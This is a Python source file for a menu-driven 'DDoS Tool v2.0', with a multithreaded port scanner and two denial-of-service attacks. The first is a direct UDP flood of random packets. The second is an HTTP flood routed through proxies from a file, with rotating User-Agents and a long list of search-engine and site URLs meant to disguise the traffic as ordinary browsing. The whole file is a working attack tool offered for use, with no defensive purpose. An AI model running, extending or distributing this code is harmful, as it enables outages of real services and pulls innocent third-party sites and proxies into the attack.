# -*- coding: utf-8 -*-
import socket
import threading
import time
import os
import random
import requests
import sys
from queue import Queue
from colorama import Fore, Style, init

# --- Initialize colorama for colored output ---
init(autoreset=True)

# --- Core Configuration ---
queue = Queue()
open_ports = []
bots = []
bytes_to_send = random._urandom(1490) # Random bytes for UDP flood
packet_count = 0

# --- Bot List Initialization ---
# This list contains URLs for various search engines and platforms.
# It's used for the proxy-based DDoS attack to make requests appear
# as if they are coming from legitimate browsing.
def initialize_bots():
    """Populate the list of bot URLs."""
    global bots
    bots.clear() # Ensure list is empty before populating

    # --- Search Engines and Directories ---
    bots.append('https://www.google.com/search?q=')
    bots.append('https://www.bing.com/search?q=')
    bots.append('https://yahoo.com/search?p=')
    bots.append('https://www.baidu.com/s?wd=')
    bots.append('https://yandex.com/search/?text=')
    bots.append('https://duckduckgo.com/?q=')
    bots.append('https://ask.com/web?q=')
    bots.append('https://search.aol.com/aol/search?q=')
    bots.append('https://www.ecosia.org/search?q=')
    bots.append('https://www.startpage.com/sp/search?query=')
    bots.append('https://www.qwant.com/?q=')
    bots.append('https://www.dogpile.com/serp?q=')
    bots.append('https://www.metacrawler.com/serp?q=')
    bots.append('https://www.info.com/serp?q=')
    bots.append('https://www.lycos.com/web?q=')
    bots.append('https://www.hotbot.com/search/web?q=')
    bots.append('https://www.entireweb.com/web?q=')
    bots.append('https://www.wow.com/search?q=')
    bots.append('https://www.webcrawler.com/serp?q=')
    bots.append('https://www.search.com/search?q=')
    bots.append('https://www.so.com/s?q=')
    bots.append('https://www.sogou.com/web?query=')

    # --- Social Media and Platforms ---
    bots.append('https://www.facebook.com/search/top/?q=')
    bots.append('https://twitter.com/search?q=')
    bots.append('https://www.instagram.com/explore/tags/')
    bots.append('https://www.linkedin.com/search/results/all/?keywords=')
    bots.append('https://www.pinterest.com/search/pins/?q=')
    bots.append('https://www.reddit.com/search/?q=')
    bots.append('https://www.tumblr.com/search/')
    bots.append('https://www.flickr.com/search/?text=')
    bots.append('https://soundcloud.com/search?q=')
    bots.append('https://vimeo.com/search?q=')
    bots.append('https://www.twitch.tv/search?term=')
    bots.append('https://www.tiktok.com/search?q=')
    bots.append('https://www.quora.com/search?q=')
    bots.append('https://medium.com/search?q=')
    bots.append('https://www.deviantart.com/browse/all/?q=')
    bots.append('https://ello.co/search?q=')
    bots.append('https://www.mixcloud.com/search/?q=')
    bots.append('https://www.last.fm/search?q=')
    bots.append('https://www.goodreads.com/search?q=')

    # --- E-commerce and Shopping ---
    bots.append('https://www.amazon.com/s?k=')
    bots.append('https://www.ebay.com/sch/i.html?_nkw=')
    bots.append('https://www.aliexpress.com/wholesale?SearchText=')
    bots.append('https://www.walmart.com/search?q=')
    bots.append('https://www.target.com/s?searchTerm=')
    bots.append('https://www.bestbuy.com/site/searchpage.jsp?st=')
    bots.append('https://www.newegg.com/p/pl?d=')
    bots.append('https://www.etsy.com/search?q=')
    bots.append('https://www.wayfair.com/keyword.php?keyword=')
    bots.append('https://www.houzz.com/products/search?s=')
    bots.append('https://www.overstock.com/search?q=')
    bots.append('https://www.kohls.com/search.jsp?search=')
    bots.append('https://www.macys.com/shop/featured/')
    bots.append('https://www.costco.com/CatalogSearch?keyword=')
    bots.append('https://www.samsclub.com/s/')

    # --- News and Media ---
    bots.append('https://www.news.google.com/search?q=')
    bots.append('https://www.bbc.co.uk/search?q=')
    bots.append('https://www.cnn.com/search/?q=')
    bots.append('https://www.reuters.com/search/news?blob=')
    bots.append('https://www.forbes.com/search/?q=')
    bots.append('https://www.bloomberg.com/search?query=')
    bots.append('https://www.wsj.com/search/term.html?KEYWORDS=')
    bots.append('https://www.nbcnews.com/search/?q=')
    bots.append('https://www.foxnews.com/search-results/search?q=')
    bots.append('https://www.cbsnews.com/search/?q=')
    bots.append('https://www.abcnews.go.com/search?query=')
    bots.append('https://www.npr.org/search?query=')
    bots.append('https://www.redd.it/search?q=')
    bots.append('https://www.dailymail.co.uk/home/search.html?sel=site&searchPhrase=')
    bots.append('https://www.theguardian.com/search?q=')
    bots.append('https://www.telegraph.co.uk/search.html?query=')
    bots.append('https://www.independent.co.uk/search/site/')
    bots.append('https://www.huffpost.com/search?q=')
    bots.append('https://www.usatoday.com/search/?q=')
    bots.append('https://www.washingtonpost.com/newssearch/?query=')

    # --- Technology and Development ---
    bots.append('https://github.com/search?q=')
    bots.append('https://stackoverflow.com/search?q=')
    bots.append('https://www.npmjs.com/search?q=')
    bots.append('https://pypi.org/search/?q=')
    bots.append('https://crates.io/search?q=')
    bots.append('https://www.nuget.org/packages?q=')
    bots.append('https://hub.docker.com/search?q=')
    bots.append('https://play.google.com/store/search?q=')
    bots.append('https://apps.apple.com/us/search?term=')
    bots.append('https://www.microsoft.com/en-us/search/result.aspx?form=DXSS12&q=')
    bots.append('https://sourceforge.net/directory/?q=')
    bots.append('https://www.codeproject.com/search.aspx?q=')
    bots.append('https://www.techcrunch.com/?s=')
    bots.append('https://www.wired.com/search/?q=')
    bots.append('https://www.theverge.com/search?q=')
    bots.append('https://arstechnica.com/search/?q=')
    bots.append('https://www.engadget.com/search/?q=')
    bots.append('https://techcrunch.com/?s=')
    bots.append('https://www.cnet.com/search/?q=')
    bots.append('https://www.zdnet.com/search?q=')

    # --- Educational and Reference ---
    bots.append('https://www.wikipedia.org/wiki/Special:Search?search=')
    bots.append('https://www.britannica.com/search?query=')
    bots.append('https://www.dictionary.com/browse/')
    bots.append('https://www.merriam-webster.com/dictionary/')
    bots.append('https://www.thesaurus.com/browse/')
    bots.append('https://www.coursera.org/search?query=')
    bots.append('https://www.edx.org/search?q=')
    bots.append('https://www.khanacademy.org/search?page_search_query=')
    bots.append('https://www.udemy.com/courses/search/?q=')
    bots.append('https://www.academia.edu/search?q=')
    bots.append('https://scholar.google.com/scholar?q=')
    bots.append('https://www.jstor.org/action/doBasicSearch?Query=')
    bots.append('https://www.scribd.com/search?query=')
    bots.append('https://www.researchgate.net/search.Search.html?type=publication&query=')
    bots.append('https://www.springer.com/gp/search?query=')
    bots.append('https://ieeexplore.ieee.org/search/searchresult.jsp?newsearch=true&queryText=')
    bots.append('https://dl.acm.org/action/doSearch?AllField=')
    bots.append('https://www.ncbi.nlm.nih.gov/search/?term=')
    bots.append('https://pubmed.ncbi.nlm.nih.gov/?term=')
    bots.append('https://www.worldcat.org/search?q=')

    # --- Entertainment and Gaming ---
    bots.append('https://www.imdb.com/find?q=')
    bots.append('https://www.rottentomatoes.com/search/?search=')
    bots.append('https://www.metacritic.com/search/all/')
    bots.append('https://www.gamespot.com/search/?q=')
    bots.append('https://www.gamefaqs.com/search/index.html?query=')
    bots.append('https://store.steampowered.com/search/?term=')
    bots.append('https://www.epicgames.com/store/en-US/browse?q=')
    bots.append('https://www.origin.com/en-us/search/')
    bots.append('https://www.ubisoft.com/en-us/search/?q=')
    bots.append('https://www.gog.com/games?search=')
    bots.append('https://www.twitch.tv/search?term=')
    bots.append('https://www.youtube.com/results?search_query=')
    bots.append('https://www.netflix.com/search?q=')
    bots.append('https://www.hulu.com/search?q=')
    bots.append('https://www.disneyplus.com/search?q=')
    bots.append('https://www.hbo.com/search?q=')
    bots.append('https://www.amazon.com/s?k=&i=instant-video')
    bots.append('https://www.crunchyroll.com/search?q=')
    bots.append('https://www.funimation.com/search/?q=')
    bots.append('https://www.bandcamp.com/search?q=')

    # --- Government and Organizations ---
    bots.append('https://www.nasa.gov/search/node/')
    bots.append('https://www.whitehouse.gov/search/?s=')
    bots.append('https://www.un.org/search/?q=')
    bots.append('https://www.who.int/search?query=')
    bots.append('https://www.cdc.gov/search.do?q=')
    bots.append('https://www.nih.gov/search/searchresult.php?search=')
    bots.append('https://www.fda.gov/search?keys=')
    bots.append('https://www.epa.gov/search?keys=')
    bots.append('https://www.fbi.gov/search?fquery=')
    bots.append('https://www.cia.gov/search?query=')
    bots.append('https://www.nsa.gov/search-results/?q=')
    bots.append('https://www.nasa.gov/search/node/')
    bots.append('https://www.loc.gov/search/?q=')
    bots.append('https://www.archives.gov/search?query=')
    bots.append('https://www.census.gov/search-results.html?q=')
    bots.append('https://www.federalreserve.gov/searchresults.htm?q=')
    bots.append('https://www.treasury.gov/search/Pages/default.aspx?k=')
    bots.append('https://www.state.gov/search/?q=')
    bots.append('https://www.defense.gov/Search-Results/?q=')
    bots.append('https://www.energy.gov/search/site/')

    # --- Miscellaneous ---
    bots.append('https://validator.w3.org/check?uri=')
    bots.append('https://jigsaw.w3.org/css-validator/validator?uri=')
    bots.append('https://www.virustotal.com/gui/search/')
    bots.append('https://www.ssllabs.com/ssltest/analyze.html?d=')
    bots.append('https://whois.domaintools.com/')
    bots.append('https://www.robtex.com/dns-lookup/')
    bots.append('https://www.shodan.io/search?query=')
    bots.append('https://censys.io/ipv4?q=')
    bots.append('https://www.zoomeye.org/searchResult?q=')
    bots.append('https://www.securitytrails.com/list/apex_domain/')
    bots.append('https://www.viewdns.info/iphistory/?domain=')
    bots.append('https://www.robtex.com/ip-lookup/')
    bots.append('https://www.iplocation.net/ip-lookup')
    bots.append('https://www.whatismyip.com/ip-address-lookup/?iref=header')
    bots.append('https://www.geolocation.com/ip-lookup/')
    bots.append('https://www.ip-tracker.org/locator/ip-lookup.php?ip=')
    bots.append('https://www.maxmind.com/en/geoip-demo')
    bots.append('https://www.ip2location.com/demo/')
    bots.append('https://www.infobyip.com/ip-lookup.php')
    bots.append('https://www.domaintools.com/research/reverse-ip/')

# --- Utility Functions ---
def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_target():
    """Prompt user for target hostname/IP."""
    print(f"{Fore.CYAN}[INPUT]{Style.RESET_ALL} Enter Target Hostname or IP:")
    target = input(f"{Fore.GREEN}>> {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No target specified.")
        time.sleep(1.5)
        return None
    # if target.lower() in ["localhost", "127.0.0.1"]:
    #     print(f"{Fore.RED}[WARNING]{Style.RESET_ALL} Attacking localhost is not recommended.")
    #     time.sleep(1.5)
    #     # You might want to add a confirmation here or prevent it entirely.
    return target

def resolve_hostname(hostname):
    """Resolve hostname to IP address."""
    try:
        ip = socket.gethostbyname(hostname)
        print(f"{Fore.GREEN}[RESOLVED]{Style.RESET_ALL} {hostname} -> {ip}")
        time.sleep(1)
        return ip
    except socket.gaierror:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Could not resolve hostname '{hostname}'.")
        time.sleep(1.5)
        return None

def get_integer_input(prompt, default):
    """Get an integer input from the user with a default value."""
    user_input = input(f"{Fore.CYAN}[INPUT]{Style.RESET_ALL} {prompt} (Default: {default}): ").strip()
    if user_input == "":
        return default
    try:
        return int(user_input)
    except ValueError:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid input. Using default: {default}")
        time.sleep(1)
        return default

# --- Port Scanning Functions ---
def scan_port(ip, port):
    """Check if a single port is open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1) # Timeout for connection attempt
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def fill_port_queue(port_list):
    """Add ports to the scanning queue."""
    for port in port_list:
        queue.put(port)

def worker_thread(ip):
    """Worker thread for scanning ports."""
    global open_ports
    while not queue.empty():
        port = queue.get()
        if scan_port(ip, port):
            print(f"{Fore.GREEN}[OPEN]{Style.RESET_ALL} Port {port}")
            open_ports.append(port)
        queue.task_done() # Mark task as done

def run_port_scan(target_ip, scan_range, num_threads):
    """Execute the port scanning process."""
    global open_ports
    open_ports = [] # Reset list for new scan
    print(f"{Fore.YELLOW}[SCANNING]{Style.RESET_ALL} {target_ip} (Ports 1-{scan_range}) with {num_threads} threads...")
    
    port_list = range(1, scan_range + 1)
    fill_port_queue(port_list)
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=lambda: worker_thread(target_ip))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for all threads to finish
    for t in threads:
        t.join()
    
    print(f"{Fore.GREEN}[DONE]{Style.RESET_ALL} Scan finished. Open ports found: {len(open_ports)}")
    if open_ports:
        print(f"{Fore.CYAN}[RESULTS]{Style.RESET_ALL} Open Ports: {', '.join(map(str, open_ports))}")
    input(f"{Fore.MAGENTA}[PAUSE]{Style.RESET_ALL} Press Enter to return to the menu...")

# --- DDoS Attack Functions ---
def ddos_udp_flood(target_ip, target_port, num_threads):
    """Perform a UDP flood DDoS attack (proxyless)."""
    global packet_count
    packet_count = 0

    def flood():
        global packet_count
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(bytes_to_send, (target_ip, target_port))
                with threading.Lock(): # Safer increment in multi-threaded env
                    packet_count += 1
                    if packet_count % 500 == 0: # Report every 500 packets
                         print(f"{Fore.GREEN}[PACKETS]{Style.RESET_ALL} Sent {packet_count}")
            except Exception as e:
                # print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} UDP Flood error: {e}") # Uncomment for debugging
                pass # Suppress errors to keep flooding

    print(f"{Fore.RED}[ATTACK]{Style.RESET_ALL} Starting UDP Flood on {target_ip}:{target_port} with {num_threads} threads...")
    print(f"{Fore.YELLOW}[STOP]{Style.RESET_ALL} Press Ctrl+C to stop the attack.")

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(0.1) # Keep main thread alive
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[STOPPED]{Style.RESET_ALL} UDP Flood attack halted by user.")
        # Note: Threads will continue briefly due to daemon nature
        input(f"{Fore.MAGENTA}[PAUSE]{Style.RESET_ALL} Press Enter to return to the menu...")

def ddos_proxy_attack(target_hostname, target_port, num_threads):
    """Perform a DDoS attack using proxies and bot URLs."""
    global packet_count
    packet_count = 0

    def attack_with_proxies():
        global packet_count
        try:
            with open('proxies.txt', 'r') as f:
                proxies_list = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} 'proxies.txt' not found. Attack aborted.")
            return

        if not proxies_list:
             print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} 'proxies.txt' is empty. Attack aborted.")
             return

        while True:
            try:
                proxy_addr = random.choice(proxies_list)
                proxies = {'http': f'http://{proxy_addr}', 'https': f'https://{proxy_addr}'}
                url = random.choice(bots) + target_hostname # Append target to bot URL
                
                # Generate a new User-Agent for each request
                headers = {'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
                ])}
                
                requests.get(url, headers=headers, proxies=proxies, timeout=5)
                with threading.Lock():
                    packet_count += 1
                    if packet_count % 100 == 0: # Report every 100 requests
                        print(f"{Fore.GREEN}[REQUESTS]{Style.RESET_ALL} Sent {packet_count} via {proxy_addr}")
            except requests.exceptions.RequestException:
                # Silently ignore proxy/request errors to maintain attack flow
                pass
            except Exception as e:
                 # print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Proxy attack error: {e}") # Uncomment for debugging
                 pass

    print(f"{Fore.RED}[ATTACK]{Style.RESET_ALL} Starting Proxy-based Attack on {target_hostname}:{target_port} with {num_threads} threads...")
    print(f"{Fore.YELLOW}[STOP]{Style.RESET_ALL} Press Ctrl+C to stop the attack.")
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Ensure 'proxies.txt' exists with one proxy per line (e.g., 123.45.67.89:8080).")

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack_with_proxies)
        t.daemon = True
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[STOPPED]{Style.RESET_ALL} Proxy-based attack halted by user.")
        input(f"{Fore.MAGENTA}[PAUSE]{Style.RESET_ALL} Press Enter to return to the menu...")

# --- Main Menu and Execution ---
def show_menu():
    """Display the main menu options."""
    clear_screen()
    print(f"{Fore.GREEN}--- DDoS Tool v2.0 (Simplified) ---{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1]{Style.RESET_ALL} Port Scanner")
    print(f"{Fore.RED}[2]{Style.RESET_ALL} DDoS Attack")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Exit")
    print("-" * 35)

def handle_ddos_menu(target_hostname, target_ip):
    """Handle the DDoS attack submenu."""
    clear_screen()
    print(f"{Fore.RED}--- DDoS Attack Options ---{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[1]{Style.RESET_ALL} UDP Flood (Direct)")
    print(f"{Fore.BLUE}[2]{Style.RESET_ALL} Proxy-based Attack (HTTP Requests)")
    print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Back to Main Menu")
    print("-" * 30)

    choice = input(f"{Fore.GREEN}>> {Style.RESET_ALL}").strip()

    if choice == "1":
        port = get_integer_input("Target Port", 80)
        threads = get_integer_input("Number of Threads", 100)
        ddos_udp_flood(target_ip, port, threads)
    elif choice == "2":
        # Note: Proxy attack uses hostname for URL construction
        port = get_integer_input("Target Port (for display)", 80)
        threads = get_integer_input("Number of Threads", 100)
        ddos_proxy_attack(target_hostname, port, threads)
    elif choice == "3":
        return
    else:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid selection.")
        time.sleep(1.5)

def main():
    """Main program loop."""
    initialize_bots() # Load bot URLs at startup
    
    if not bots:
        print(f"{Fore.RED}[CRITICAL]{Style.RESET_ALL} Bot list initialization failed or is empty.")
        input("Press Enter to exit...")
        sys.exit(1)

    while True:
        show_menu()
        option = input(f"{Fore.GREEN}>> {Style.RESET_ALL}").strip()

        if option == "1":
            clear_screen()
            target = get_target()
            if target:
                ip = resolve_hostname(target)
                if ip:
                    scan_range = get_integer_input("Port Scan Range (e.g., 1000 for ports 1-1000)", 1000)
                    threads = get_integer_input("Number of Scanner Threads", 50)
                    run_port_scan(ip, scan_range, threads)
        
        elif option == "2":
            clear_screen()
            target = get_target()
            if target:
                ip = resolve_hostname(target)
                if ip:
                    handle_ddos_menu(target, ip) # Pass hostname for proxy attack

        elif option == "3":
            clear_screen()
            print(f"{Fore.GREEN}[EXIT]{Style.RESET_ALL} Goodbye!")
            time.sleep(1)
            break
        
        else:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid option selected.")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
    
    # Made with love (Ahmad)